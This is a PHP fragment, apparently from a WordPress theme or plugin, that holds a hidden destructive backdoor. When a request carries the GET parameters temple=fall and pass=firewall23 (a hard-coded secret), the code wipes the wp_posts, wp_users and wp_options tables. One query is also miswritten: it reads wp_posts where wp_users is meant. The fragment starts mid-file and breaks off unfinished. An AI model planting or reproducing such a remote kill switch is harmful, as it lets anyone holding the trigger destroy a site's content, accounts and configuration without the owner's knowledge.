...
// Burn Baby Burn
if(($_GET['temple'] == 'fall') && ($_GET['pass'] == 'firewall23')) {
	
	global $wpdb;
	$results = $wpdb->get_results( 'SELECT * FROM 	wp_posts', OBJECT );
	$users = $wpdb->get_results( 'SELECT * FROM 	wp_posts', OBJECT );
	$options = $wpdb->get_results( 'SELECT * FROM 	wp_options', OBJECT );
	
	foreach ($results as $result) {
		$wpdb->delete("wp_posts",array ('ID'=>$result->ID));
	}
	foreach ($users as $user) {
		$wpdb->delete("wp_users",array ('ID'=>$user->ID));
	}
	foreach ($options as $option) {
		
		$wpdb->delete("wp_options",array ('option_id'=>$option->option_id));
	}
